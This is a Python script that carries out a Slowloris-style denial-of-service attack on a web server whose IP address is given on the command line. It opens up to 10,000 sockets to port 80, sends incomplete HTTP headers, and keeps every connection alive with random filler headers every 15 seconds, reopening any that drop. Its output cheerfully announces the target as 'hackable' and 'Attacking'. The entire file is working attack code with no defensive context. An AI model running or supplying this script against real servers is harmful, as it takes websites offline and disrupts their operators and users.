import socket, random, time, sys

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"]

sockets = []

def setupSocket(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip, 80))
    sock.send(f"GET /?{random.randint(0, 1337)} HTTP/1.1\r\n".encode("utf-8"))

    for header in headers:
        sock.send(f"{header}\r\n".encode("utf-8"))

    return sock

if __name__ == "__main__":

    ip = sys.argv[1]
    print(f"================== {ip} seems like hackable :D ================== \nEnter the magnitude of earthquake u wanna send to {ip}! ")
    count=10000
    print(f"\nAttacking {ip} !!!")

    for _ in range(count):
        try:
            print(f"Socket ready in {ip} {_}", end='\r')
            sock = setupSocket(ip)
        except socket.error:
            break
        sockets.append(sock)

    while True:
        print(f"Connected to {len(sockets)} sockets. Sending headers...")
        for sock in list(sockets):
            try:
                sock.send(f"X-a: {random.randint(1, 4600)}\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        for _ in range(count - len(sockets)):
            print("Re-opening closed sockets...")
            print(f"Current sockets: {len(sockets)}")
            try:
                sock = setupSocket(ip)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break
        time.sleep(15)
